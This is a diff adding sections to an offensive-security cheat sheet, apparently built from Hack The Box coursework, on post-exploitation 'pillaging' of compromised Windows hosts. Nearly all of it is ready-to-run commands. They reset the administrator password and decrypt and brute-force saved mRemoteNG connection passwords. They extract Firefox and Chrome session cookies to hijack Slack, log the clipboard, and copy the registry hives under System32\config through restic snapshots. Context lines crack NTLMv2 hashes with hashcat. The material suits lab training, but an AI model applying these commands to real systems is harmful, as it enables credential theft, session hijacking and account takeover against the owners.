@@ -1,3 +1,7 @@
+# Change users password
+```
+net user administrator password
+```
 #  SeImpersonate
 ```
 xp_cmdshell whoami /priv
@@ -876,3 +880,128 @@ https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/
 ```
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 ```
+# Pillaging
+## Checklist
+```
+Data Sources
+Below are some of the sources from which we can obtain information from compromised systems:
+
+Installed applications
+Installed services
+Websites
+File Shares
+Databases
+Directory Services (such as Active Directory, Azure AD, etc.)
+Name Servers
+Deployment Services
+Certificate Authority
+Source Code Management Server
+Virtualization
+Messaging
+Monitoring and Logging Systems
+Backups
+Sensitive Data
+Keylogging
+Screen Capture
+Network Traffic Capture
+Previous Audit reports
+User Information
+History files, interesting documents (.doc/x,.xls/x,password./pass., etc)
+Roles and Privileges
+Web Browsers
+IM Clients
+```
+## Identifying Common Applications
+```
+dir "C:\Program Files"
+```
+### With Powershell
+```
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+```
+```
+PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+```
+```
+$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+```
+### Enumerating program
+```
+ls C:\Users\julio\AppData\Roaming\mRemoteNG
+```
+### mRemoteNG-Decrypt
+https://github.com/haseebT/mRemoteNG-Decrypt.git
+```
+python3 mremoteng_decrypt.py -s "IZxeG5zCN6eBuKe9Cwqy+Grk2n95KHmzC5yE3icpkyqTwRKUnchjFqziUqP+Bad69+WTLq8M2vlgrBQ="
+```
+### Cracking with Bashloop
+```
+for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBsuHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
+```
+## Abusing Cookies
+### Cookie Extraction from Fire Fox
+```
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+```
+Copy the cookie to the the local file share on Kali and use the cookieextractor.py script that can be found in the github
+### Strings on the cookie
+```
+strings cookies.sqlite
+```
+### Cookieextractor.py
+```
+python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
+```
+Put the cookie in the cookie editor plug in and save/refresh
+### Chrome Cookies
+Cookie Extraction from Chromium-based Browsers
+The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with Data Protection API (DPAPI). DPAPI is commonly used to encrypt data using information from the current user account or computer.
+
+To get the cookie value, we'll need to perform a decryption routine from the session of the user we compromised. Thankfully, a tool SharpChromium does what we need. It connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.
+https://github.com/djhohnstein/SharpChromium
+
+```
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+```
+```
+Invoke-SharpChromium -Command "cookies slack.com"
+```
+## Clipboard
+Execute the code in Powershell ISE form Invoke-Clipboard.ps1
+```Invoke-ClipboardLogger
+```
+## Attacking Backup Servers
+https://restic.net/
+
+https://github.com/restic/restic/releases/tag/v0.15.1
+### Initiallizing backup dir
+```
+mkdir E:\restic2; restic.exe -r E:\restic2 init
+```
+### Backup a directory
+```
+$env:RESTIC_PASSWORD = 'Password'
+```
+```
+restic.exe -r E:\restic2\ backup C:\SampleFolder
+```
+### Back up a Directory with VSS
+```
+restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
+```
+### Check Backups Saved in a Repository
+```
+restic.exe -r E:\restic2\ snapshots
+```
+```
+restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
+```
+
+
+
+
+
+
+
+
+
